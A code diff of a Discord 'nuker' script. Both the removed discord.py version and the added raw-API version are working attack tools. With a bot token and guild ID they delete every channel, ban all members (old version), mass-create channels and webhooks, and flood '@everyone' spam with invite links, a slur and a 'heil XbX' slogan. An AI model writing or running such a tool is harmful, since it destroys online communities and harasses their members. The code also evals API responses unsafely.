@@ -1,124 +1,121 @@
-import discord
-import random
-from discord import Client, Permissions
-from colorama import Back, Fore, Style
-from pystyle import Colorate, Colors
+import aiohttp
 import asyncio
+import time
+import requests
+import json
+import threading
 
+null = None
+false = False
+true = True
 
-ascii_art = """
+discord_api_version = 9
+discord_api_base_url = f"https://discord.com/api/v{discord_api_version}"
 
-▄▄▄█████▓ ██▒   █▓ ▄████▄      ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
-▓  ██▒ ▓▒▓██░   █▒▒██▀ ▀█      ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
-▒ ▓██░ ▒░ ▓██  █▒░▒▓█    ▄    ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
-░ ▓██▓ ░   ▒██ █░░▒▓▓▄ ▄██▒   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
-  ▒██▒ ░    ▒▀█░  ▒ ▓███▀ ░   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
-  ▒ ░░      ░ ▐░  ░ ░▒ ▒  ░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
-    ░       ░ ░░    ░  ▒      ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
-  ░           ░░  ░              ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
-               ░  ░ ░                  ░    ░     ░  ░      ░  ░   ░     
-              ░   ░                                                      
-    """
-print(Colorate.Horizontal(Colors.blue_to_purple, ascii_art))
-print(Colorate.Horizontal(Colors.yellow_to_green, """================================ MOTD ==========================================
-                          """))
-print("                     fuck skids | TVC x UTL ontop!")
-print(Colorate.Horizontal(Colors.green_to_blue, """
-================================ MOTD =========================================="""))
+token = "" #bot token
+guild_id = "" #guild to nuke
 
-version = """
- ╔════════════════╦════════════════════╗
- ║ Version 2.5    ║ Core Version 2.5   ║
- ╚════════════════╩════════════════════╝
-"""
-print(Colorate.Vertical(Colors.blue_to_purple, version))
+bot_token = "Bot " + token
+headers = {"Authorization": bot_token , 'Content-type': 'application/json'}
 
-menu = (f"""
- ╔══════════════════╦═══════════════════╗
- ║ 1: delete all    ║  3: banall        ║
- ║══════════════════╬═══════════════════║
- ║ 2: rolespam      ║ 4: ping spam      ║
- ╚══════════════════╩═══════════════════╝
-""")
-print(Colorate.Vertical(Colors.purple_to_blue, menu))
- 
-
-intents = discord.Intents.default()
-intents.all()
-
-client = discord.Client(intents=intents)
-
-TOKEN = 'put the bot token here'
-
-async def deleteall(guild):
+def create_channel_with_spam(channel_name):
     try:
-        channels = guild.text_channels
-        await asyncio.gather(*[channel.delete() for channel in channels])
-        await asyncio.gather(*[guild.create_text_channel(f"NUKED BY TVC") for _ in range(100)])
-    except discord.Forbidden as e:
-        print(f"Failed to delete/create channels: {e}")
+        headers = {"Authorization": bot_token , 'Content-type': 'application/json'}
+        payload = {"type":0,"name":channel_name,"permission_overwrites":[]}
+        r = requests.post(f"{discord_api_base_url}/guilds/{guild_id}/channels", headers=headers , data = json.dumps(payload))
+        new_channel_info = eval(r.text)
+        new_channel_id = new_channel_info["id"]
+        print(f"Created channel {channel_name}")
+        
+        payload = {"name":"TVC"}
+        r = requests.post(f"{discord_api_base_url}/channels/{new_channel_id}/webhooks", headers=headers , data = json.dumps(payload))
+        new_webhook_info = eval(r.text)
+        new_webhook_id = new_webhook_info["id"]
+        new_webhook_token = new_webhook_info["token"]
+        new_webhook_url = f"https://discord.com/api/webhooks/{new_webhook_id}/{new_webhook_token}"
+        
+        message_content = f"@everyone Nuked by TVC | TVC & XbX ontop! | https://discord.gg/JYwBtEp5np | https://discord.gg/cYw8gqj2FX | https://www.youtube.com/@VisionAntiGacha"
+        
+        for _ in range(30):
+            data = {"content" : message_content}
+            r = requests.post(new_webhook_url, json = data)
+    except:
+        pass
 
-
-async def rolespam(guild):
+def create_channel_weaker(channel_name):
     try:
-        await asyncio.gather(*[guild.create_role(name='NUKED') for _ in range(100)])
-        role = discord.utils.get(guild.roles, name='NUKED')
-        await asyncio.gather(*[member.add_roles(role) for member in guild.members if not member.bot])
-    except discord.Forbidden as e:
-        print(f"Failed to create role or assign roles: {e}")
-    except AttributeError:
-        print("Role not found.")
-    except Exception as e:
-        print(f"Failed to add role to members: {e}")
+        headers = {"Authorization": bot_token , 'Content-type': 'application/json'}
+        payload = {"type":0,"name":channel_name,"permission_overwrites":[]}
+        r = requests.post(f"{discord_api_base_url}/guilds/{guild_id}/channels", headers=headers , data = json.dumps(payload))
+        new_channel_info = eval(r.text)
+        new_channel_id = new_channel_info["id"]
+        print(f"Created a {channel_name} channel")
+    except:
+        pass
 
+async def delete_channel(session, url):
+    async with session.delete(url) as resp:
+        try:
+            response = await resp.json()
+            return response
+        except:
+            pass
 
-async def banall(guild):
+async def nuke(guild_channels):
+
+    data_payload = {
+        "description": None,
+        "features": ["NEWS"],
+        "preferred_locale": "en-US",
+        "rules_channel_id": None,
+        "public_updates_channel_id": None}
+
     try:
-        await asyncio.gather(*[member.ban(reason="NUKED") for member in guild.members if not member.bot])
-    except discord.Forbidden as e:
-        print(f"Failed to ban members: {e}")
-    except Exception as e:
-        print(f"Failed to ban members: {e}")
+        r = requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}" ,headers = headers , json = data_payload)
+    except:
+        pass
 
+    async with aiohttp.ClientSession(headers=headers) as session:
 
-async def spammessage(guild):
-    try:
-        channels = guild.text_channels
-        while True:
-            tasks = [channel.send(
-                '@everyone Join TVC or ur retarded https://discord.gg/Ha5NQHSgcy https://www.youtube.com/watch?v=Isz3938g5pQ| @everyone Join TVC or ur retarded https://discord.gg/Ha5NQHSgcy https://www.youtube.com/watch?v=Isz3938g5pQ  https://cdn.discordapp.com/attachments/1191984469385674763/1193009590774812802/funni_cat_3.mov?ex=65ab27c3&is=6598b2c3&hm=ab92f8372f01a9a41d2455902936597761da48d3f7ccc65f8cb300ff17bb829d&')
-                     for _ in range(5) for channel in channels]
-            await asyncio.gather(*tasks)
-    except discord.Forbidden as e:
-        print(f"Failed to send messages: {e}")
-    except Exception as e:
-        print(f"Failed to send messages: {e}")
+        tasks = []
+        for channel in guild_channels:
+            try:
+                channel_id = channel["id"]
+                url = f"{discord_api_base_url}/channels/{channel_id}"
+                tasks.append(asyncio.ensure_future(delete_channel(session, url)))
+            except:
+                pass
 
+        responses = await asyncio.gather(*tasks)
+        for response in responses:
+            try:
+                name = response["name"]
+                id = response["id"]
+                print(f"Deleted channel {name} | Id --> {id}")
+            except:
+                pass
 
-@client.event
-async def on_ready():
-    await client.change_presence(activity=discord.Game(name='just chilling'))
-    await handle_console_input()
+    threads = []
 
+    for x in range(50):
+        try:
+            thread = threading.Thread(target=create_channel_with_spam, args=("TVC ontop",))
+            thread.start()
+            threads.append(thread)
+        except:
+            pass
 
-async def handle_console_input():
-    while True:
-        command = await client.loop.run_in_executor(None, input, 'Choice : ')
-        args = command.split(' ')
-        guild = client.guilds[0]  # Assuming you want to perform actions on the first guild the bot is in
-        if args[0] == '1':
-            await deleteall(guild)
-        elif args[0] == '2':
-            await rolespam(guild)
-        elif args[0] == '3':
-            await banall(guild)
-        elif args[0] == '4':
-            await spammessage(guild)
-        elif command == 'exit':
-            break
-        else:
-            print('Invalid command. Try "1", "2", "3", "4", or "exit.')
-            
+    for x in range(300):
+        try:
+            thread = threading.Thread(target=create_channel_weaker, args=("heil XbX",))
+            thread.start()
+            threads.append(thread)
+        except:
+            pass
 
-client.run(TOKEN)
+        for thread in threads:
+            thread.join()
 
+r = requests.get(f"{discord_api_base_url}/guilds/{guild_id}/channels", headers=headers)
+guild_channels = eval(r.text)
+asyncio.run(nuke(guild_channels))
